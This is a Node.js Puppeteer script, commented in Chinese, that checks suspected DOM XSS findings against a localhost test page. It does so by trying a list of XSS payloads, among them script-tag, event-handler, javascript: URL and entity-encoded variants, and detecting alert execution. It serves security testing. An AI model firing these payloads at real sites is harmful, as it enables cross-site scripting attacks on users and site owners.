// verify_dom_xss.js
const fs = require('fs');
const path = require('path');
const puppeteer = require('puppeteer');
const { browerHttpJob } = require('./core/core.js');

// 配置选项
const config = {
    resultsFile: path.join(__dirname, 'dom_xss_results.json'),
    baseUrl: 'http://localhost:5500/dom_xss_test.html',
    payloads: [
        // 基本的 XSS 有效载荷
        '<img src=x onerror=alert(document.domain)>',
        '<script>alert(document.domain)</script>',
        '"><script>alert(document.domain)</script>',
        '\'><script>alert(document.domain)</script>',
        'javascript:alert(document.domain)',
        // 事件处理程序
        '" onmouseover="alert(document.domain)" "',
        '\' onmouseover=\'alert(document.domain)\' \'',
        // JavaScript URL
        'javascript:alert(document.domain)//',
        // 编码绕过
        '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#110;&#41;',
        // eval 执行
        'alert(document.domain)',
        'console.log(document.domain)',
        // 动态脚本创建
        'document.write("<script>alert(document.domain)</script>")'
    ],
    verificationMarker: 'XSS_VERIFIED'
};

// 读取检测结果
function loadResults() {
    try {
        const data = fs.readFileSync(config.resultsFile, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        console.error('无法读取结果文件:', error);
        return [];
    }
}

// 构建测试 URL
function buildTestUrl(vulnerability, payload) {
    const url = new URL(config.baseUrl);
    
    // 根据漏洞源确定参数
    if (vulnerability.source.label === 'URL Parameter') {
        url.searchParams.set(vulnerability.source.property, payload);
    } else if (vulnerability.source.label === 'location.hash') {
        url.hash = payload;
    } else {
        // 对于其他源，尝试添加到常见参数
        url.searchParams.set('name', payload);
        url.searchParams.set('code', payload);
        url.searchParams.set('script', payload);
        url.searchParams.set('redirect', payload);
        url.searchParams.set('store', payload);
    }
    
    return url.toString();
}

// 验证 XSS 漏洞
async function verifyXSSVulnerability(vulnerability, browser) {
    console.log(`\n正在验证漏洞: ${vulnerability.type || 'DOM XSS'}`);
    console.log(`源: ${vulnerability.source.label} (${vulnerability.source.property})`);
    console.log(`接收点: ${vulnerability.sink.label}`);
    
    let isVulnerable = false;
    let successfulPayload = null;
    
    for (const payload of config.payloads) {
        const testUrl = buildTestUrl(vulnerability, payload);
        console.log(`\n测试 URL: ${testUrl}`);
        console.log(`测试载荷: ${payload}`);
        
        try {
            // 使用 browerHttpJob 发送请求
            const job = new browerHttpJob(browser);
            job.url = testUrl;
            job.method = "GET";
            job.headers = [
                { name: "User-Agent", value: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" }
            ];
            
            await job.execute();
            
            // 检查响应中是否有 XSS 执行的标记
            const page = job.tab;
            
            // 注入检测代码
            await page.evaluate((marker) => {
                // 重写 alert 函数来捕获 XSS 执行
                window.originalAlert = window.alert;
                window.alert = function(msg) {
                    document.body.setAttribute('data-xss-executed', marker);
                    console.log(`XSS 执行成功: ${msg}`);
                    return window.originalAlert.apply(this, arguments);
                };
                
                // 重写 console.log 函数
                window.originalConsoleLog = window.console.log;
                window.console.log = function(msg) {
                    if (String(msg).includes(document.domain)) {
                        document.body.setAttribute('data-xss-executed', marker);
                    }
                    return window.originalConsoleLog.apply(this, arguments);
                };
            }, config.verificationMarker);
            
            // 等待可能的 XSS 执行
            await page.waitForTimeout(2000);
            
            // 检查是否有 XSS 执行标记
            const wasExecuted = await page.evaluate((marker) => {
                return document.body.getAttribute('data-xss-executed') === marker;
            }, config.verificationMarker);
            
            if (wasExecuted) {
                console.log('✅ XSS 攻击成功!');
                isVulnerable = true;
                successfulPayload = payload;
                break;
            } else {
                console.log('❌ XSS 攻击失败');
            }
            
        } catch (error) {
            console.error(`测试过程中出错: ${error.message}`);
        }
    }
    
    return {
        ...vulnerability,
        verified: isVulnerable,
        successfulPayload
    };
}

// 主函数
async function verifyDOMXSSVulnerabilities() {
    console.log('开始验证 DOM XSS 漏洞...');
    
    const vulnerabilities = loadResults();
    if (vulnerabilities.length === 0) {
        console.log('没有找到需要验证的漏洞');
        return;
    }
    
    console.log(`加载了 ${vulnerabilities.length} 个潜在漏洞`);
    
    const browser = await puppeteer.launch({
        headless: false,
        args: ['--no-sandbox', '--disable-setuid-sandbox']
    });
    
    try {
        const verificationResults = [];
        
        for (const vulnerability of vulnerabilities) {
            const result = await verifyXSSVulnerability(vulnerability, browser);
            verificationResults.push(result);
        }
        
        // 保存验证结果
        const verifiedResultsFile = path.join(__dirname, 'verified_dom_xss_results.json');
        fs.writeFileSync(
            verifiedResultsFile,
            JSON.stringify(verificationResults, null, 2)
        );
        
        // 统计结果
        const verifiedCount = verificationResults.filter(v => v.verified).length;
        console.log(`\n验证完成!`);
        console.log(`总漏洞数: ${vulnerabilities.length}`);
        console.log(`已验证漏洞数: ${verifiedCount}`);
        console.log(`验证结果已保存到: ${verifiedResultsFile}`);
        
    } catch (error) {
        console.error('验证过程中出错:', error);
    } finally {
        await browser.close();
        console.log('浏览器已关闭');
    }
}

verifyDOMXSSVulnerabilities().catch(console.error);